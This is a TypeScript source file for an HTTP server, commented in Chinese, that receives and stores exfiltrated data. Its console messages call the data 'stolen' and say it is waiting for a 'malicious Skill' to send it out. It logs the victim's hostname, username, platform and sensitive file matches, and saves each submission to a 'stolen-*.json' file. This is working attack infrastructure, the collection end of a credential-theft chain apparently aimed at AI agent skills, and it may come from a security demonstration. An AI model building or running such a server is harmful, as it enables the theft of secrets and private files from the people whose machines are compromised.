/**
 * 数据接收服务器 (调试版)
 */

import * as http from "http";
import * as fs from "fs";
import * as path from "path";

const PORT = 9999;
const LOG_DIR = "./collected-data";

if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true });
}

const server = http.createServer((req, res) => {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/api/collect") {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    req.on("end", () => {
      console.log("\n" + "=".repeat(60));
      console.log("📦 收到窃取数据");
      console.log("=".repeat(60));

      try {
        const data = JSON.parse(body);
        
        // 兼容不同数据格式
        const timestamp = data.timestamp || new Date().toISOString();
        const hostname = data.hostname || "unknown";
        const username = data.username || "unknown";
        const platform = data.platform || data.systemInfo?.platform || "unknown";
        const findings = data.findings || [];

        // 打印摘要
        console.log(`\n时间: ${timestamp}`);
        console.log(`主机: ${hostname}`);
        console.log(`用户: ${username}`);
        console.log(`平台: ${platform}`);
        console.log(`\n发现敏感信息: ${findings.length} 处\n`);

        // 打印详细信息
        for (const f of findings) {
          console.log(`  [${f.type}] ${f.file}`);
          for (const m of f.matches || []) {
            const masked = m.length > 20 
              ? m.substring(0, 10) + "..." + m.substring(m.length - 5)
              : m;
            console.log(`    - ${masked}`);
          }
        }

        // 保存到文件
        const filename = `stolen-${Date.now()}.json`;
        const filepath = path.join(LOG_DIR, filename);
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        console.log(`\n✅ 数据已保存: ${filepath}`);

        // 返回成功
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "success", saved: filename }));
        
      } catch (error: any) {
        console.error("❌ 解析错误:", error.message);
        res.writeHead(400, { "Content-Type": "text/plain" });
        res.end("Bad Request: " + error.message);
      }
    });
  } else if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200);
    res.end("OK");
  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

server.listen(PORT, () => {
  console.log("=".repeat(60));
  console.log("🎯 数据接收服务器已启动");
  console.log("=".repeat(60));
  console.log(`\n监听端口: ${PORT}`);
  console.log(`接收端点: http://0.0.0.0:${PORT}/api/collect`);
  console.log(`数据目录: ${LOG_DIR}/\n`);
  console.log("等待恶意 Skill 外发数据...\n");
  console.log("=".repeat(60));
});